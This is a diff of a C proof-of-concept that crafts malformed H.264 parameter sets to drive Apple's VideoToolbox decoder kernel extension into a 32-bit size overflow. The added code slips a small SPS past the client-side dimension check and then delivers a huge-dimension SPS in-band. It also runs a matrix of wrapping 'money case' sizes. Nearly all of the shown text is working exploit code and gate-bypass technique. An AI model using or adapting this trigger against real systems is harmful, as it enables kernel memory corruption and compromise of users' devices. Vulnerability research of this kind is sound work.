@@ -136,7 +136,7 @@ static int nal_header(int type, int ref_idc) { return ((ref_idc & 3) << 5) | (ty
 static void build_sps(bw_t *b, int mb_w, int mb_h, int level)
 {
 	bw_init(b);
-	bw_bits(b, 8, nal_header(25, 3));
+	bw_bits(b, 8, nal_header(7, 3));   /* SPS: type 7, ref_idc 3 -> 0x67 (25 was a typo: type 25 is reserved and Apple rejects the set) */
 	bw_bits(b, 8, 66);            /* profile_idc = baseline (no chroma_format_idc) */
 	bw_bits(b, 8, 0);             /* constraint flags + reserved */
 	bw_bits(b, 8, level);         /* level_idc */
@@ -246,6 +246,18 @@ static int run_one(int mb_w, int mb_h, int mode)
 	build_pps(&pps);
 	build_idr(&idr);
 
+	/* mode 0: the huge SPS rides in the avcC - tests the CLIENT-side gate.
+	   mode 1: a small SPS (32x32 mbs = 512x512) rides in the avcC so the client
+	           gate passes, and the huge SPS is delivered IN-BAND ahead of the
+	           IDR - the kext parses it and allocates from the huge dims. */
+	bw_t *avc_sps = &sps;
+	bw_t sps_small;
+	if (mode == 1) {
+		build_sps(&sps_small, 32, 32, 51);
+		avc_sps = &sps_small;
+		rline("  mode 1: small SPS in avcC, huge SPS in-band");
+	}
+
 	long long px_w = (long long)mb_w * 16;
 	long long px_h = (long long)mb_h * 16;
 	unsigned area32 = (unsigned)((unsigned long long)(px_w * px_h) & 0xFFFFFFFFull);
@@ -254,7 +266,7 @@ static int run_one(int mb_w, int mb_h, int mode)
 	       mb_w, mb_h, px_w, px_h, px_w * px_h, area32, area_signed);
 
 	unsigned char avcc[1024];
-	int avccl = build_avcC(&sps, &pps, avcc, sizeof(avcc));
+	int avccl = build_avcC(avc_sps, &pps, avcc, sizeof(avcc));
 	if (avccl < 0) {
 		rline("  avcC too big");
 		return 1;
@@ -263,8 +275,8 @@ static int run_one(int mb_w, int mb_h, int mode)
 
 	/* format description straight from the parameter sets - the SPS carries the
 	   real dimensions; the wrapper's w/h are only a hint. */
-	const uint8_t *ps[2] = { sps.buf, pps.buf };
-	size_t psz[2] = { (size_t)bw_len(&sps), (size_t)bw_len(&pps) };
+	const uint8_t *ps[2] = { avc_sps->buf, pps.buf };
+	size_t psz[2] = { (size_t)bw_len(avc_sps), (size_t)bw_len(&pps) };
 	CMVideoFormatDescriptionRef fmt = NULL;
 	OSStatus st = CMVideoFormatDescriptionCreateFromH264ParameterSets(
 	    kCFAllocatorDefault, 4, ps, psz, 2, &fmt);
@@ -287,14 +299,33 @@ static int run_one(int mb_w, int mb_h, int mode)
 		return 2;
 	}
 
-	/* sample: 4-byte length prefix + the IDR NAL (avcC / length-prefixed mode) */
-	uint8_t slen[4] = { 0, 0, 0, 0 };
-	slen[3] = (uint8_t)bw_len(&idr);
-	size_t total = 4 + bw_len(&idr);
-	unsigned char *raw = (unsigned char *)malloc(total);
-	if (raw) {
-		memcpy(raw, slen, 4);
-		memcpy(raw + 4, idr.buf, bw_len(&idr));
+	/* sample: 4-byte length prefix + NALs (avcC / length-prefixed mode).
+	   mode 1 prepends the huge in-band SPS so the kext re-reads the dims. */
+	size_t total;
+	unsigned char *raw = NULL;
+	if (mode == 1) {
+		total = 4 + bw_len(&sps) + 4 + bw_len(&idr);
+		raw = (unsigned char *)malloc(total);
+		if (raw) {
+			size_t o = 0;
+			raw[o++] = 0; raw[o++] = 0;
+			raw[o++] = (unsigned char)((bw_len(&sps) >> 8) & 0xFF);
+			raw[o++] = (unsigned char)(bw_len(&sps) & 0xFF);
+			memcpy(raw + o, sps.buf, bw_len(&sps)); o += bw_len(&sps);
+			raw[o++] = 0; raw[o++] = 0;
+			raw[o++] = (unsigned char)((bw_len(&idr) >> 8) & 0xFF);
+			raw[o++] = (unsigned char)(bw_len(&idr) & 0xFF);
+			memcpy(raw + o, idr.buf, bw_len(&idr));
+		}
+	} else {
+		total = 4 + bw_len(&idr);
+		raw = (unsigned char *)malloc(total);
+		if (raw) {
+			raw[0] = 0; raw[1] = 0;
+			raw[2] = (unsigned char)((bw_len(&idr) >> 8) & 0xFF);
+			raw[3] = (unsigned char)(bw_len(&idr) & 0xFF);
+			memcpy(raw + 4, idr.buf, bw_len(&idr));
+		}
 	}
 
 	CMBlockBufferRef bb = NULL;
@@ -356,8 +387,15 @@ int main(void)
 				}
 			}
 		} else {
-			rlinef("--- single %d x %d mbs, mode %d ---", mb_w, mb_h, mode);
-			run_one(mb_w, mb_h, mode);
+			/* default matrix: both money cases x both modes, 4095 as the
+			   negative-check control (its area is signed-negative so the
+			   kext's tbnz should reject it - a clean error there is GOOD). */
+			static const int cases[3][2] = { { 4096, 4096 }, { 4097, 4097 }, { 4095, 4095 } };
+			for (int m = 0; m < 2; m++)
+				for (int i = 0; i < 3; i++) {
+					rlinef("--- matrix mode=%d %dx%d mbs ---", m, cases[i][0], cases[i][1]);
+					run_one(cases[i][0], cases[i][1], m);
+				}
 		}
 		rline("vtdec DONE");
 		if (g_report) { fflush(g_report); fclose(g_report); g_report = NULL; }
